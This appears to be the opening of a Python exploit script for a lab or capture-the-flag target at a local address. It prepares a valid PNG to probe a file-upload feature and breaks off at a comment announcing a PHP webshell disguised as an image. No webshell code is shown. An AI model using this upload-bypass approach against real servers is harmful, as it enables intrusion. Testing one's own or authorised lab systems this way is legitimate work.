import requests
import os
import base64
import subprocess
from io import BytesIO

base_url = "http://127.0.0.1:32824"

# Create a simple valid PNG image to test normal upload behavior
# This allows us to see where the file is saved and how the application handles it
def create_test_png():
    # Simple 1x1 transparent PNG
    png_data = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==')
    return png_data

# Create a PHP webshell disguised as an image
